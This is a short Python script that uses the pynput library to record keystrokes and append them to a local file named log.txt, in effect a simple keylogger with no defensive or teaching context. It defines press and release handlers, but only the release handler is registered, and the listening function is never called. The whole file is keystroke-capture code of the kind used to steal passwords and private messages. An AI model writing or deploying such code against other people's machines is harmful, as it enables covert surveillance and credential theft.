from pynput import keyboard

def write_file(text, file='log.txt'):
  with open(file, 'a') as f:
      f.write(str(text))

def on_press(key):
  try:
    write_file(key.char)
  except AttributeError:
    if (key == keyboard.Key.space):
      write_file(' ')

def on_release(key):
  try:
    write_file(key.char)
  except AttributeError:
    if (key == keyboard.Key.space):
      write_file(' ')

def listen():
  with keyboard.Listener(on_release=on_release) as event:
    event.join()
